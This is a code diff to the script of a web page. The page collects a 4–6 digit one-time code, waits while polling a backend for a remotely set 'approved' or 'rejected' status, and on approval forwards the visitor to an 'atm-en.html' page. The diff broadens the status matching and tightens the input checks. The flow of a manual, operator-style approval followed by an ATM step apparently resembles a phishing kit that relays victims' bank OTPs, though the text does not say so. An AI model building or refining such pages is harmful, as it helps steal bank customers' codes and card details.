@@ -340,22 +340,44 @@
     var rejectOverlay = document.getElementById('rejectOverlay');
     var statusPollTimer = null;
 
+    function normalizeStatus(value){
+      return String(value || '').trim().toLowerCase();
+    }
+
+    function isApprovedStatus(value){
+      var status = normalizeStatus(value);
+      return ['approved', 'accept', 'accepted', 'otp', 'verified', 'success'].indexOf(status) !== -1;
+    }
+
+    function isRejectedStatus(value){
+      var status = normalizeStatus(value);
+      return ['rejected', 'reject', 'declined', 'error', 'failed'].indexOf(status) !== -1;
+    }
+
     function stopPoll(){
       clearInterval(statusPollTimer);
       statusPollTimer = null;
     }
 
+    function redirectToAtm(){
+      stopPoll();
+      waitOverlay.classList.remove('show');
+      if (requestId) {
+        window.location.href = 'atm-en.html?id=' + requestId;
+      }
+    }
+
     function pollOtpStatus(){
+      stopPoll();
       statusPollTimer = setInterval(function(){
         fetch('/api/status/' + requestId)
           .then(function(res){ return res.json(); })
           .then(function(data){
-            if (!data.ok) return;
-            if (data.status === 'approved') {
-              stopPoll();
-              waitOverlay.classList.remove('show');
-              window.location.href = 'atm-en.html?id=' + requestId;
-            } else if (data.status === 'rejected') {
+            if (!data || !data.status) return;
+            var status = normalizeStatus(data.status);
+            if (isApprovedStatus(status)) {
+              redirectToAtm();
+            } else if (isRejectedStatus(status)) {
               stopPoll();
               waitOverlay.classList.remove('show');
               rejectOverlay.classList.add('show');
@@ -369,7 +391,7 @@
 
     verifyBtn.addEventListener('click', function(){
       var code = otpInput.value.trim();
-      if (!code) {
+      if (!/^\d{4,6}$/.test(code)) {
         otpField.classList.add('invalid');
         return;
       }
@@ -385,8 +407,19 @@
       })
       .then(function(res){ return res.json(); })
       .then(function(data){
-        if (data.ok) {
-          pollOtpStatus();
+        if (data && data.ok) {
+          fetch('/api/status/' + requestId)
+            .then(function(res){ return res.json(); })
+            .then(function(statusData){
+              if (statusData && statusData.status && isApprovedStatus(statusData.status)) {
+                redirectToAtm();
+                return;
+              }
+              pollOtpStatus();
+            })
+            .catch(function(){
+              pollOtpStatus();
+            });
         } else {
           waitOverlay.classList.remove('show');
           rejectOverlay.classList.add('show');
@@ -394,6 +427,8 @@
       })
       .catch(function(err){
         console.warn('Could not reach the backend server:', err);
+        waitOverlay.classList.remove('show');
+        rejectOverlay.classList.add('show');
       });
     });
 
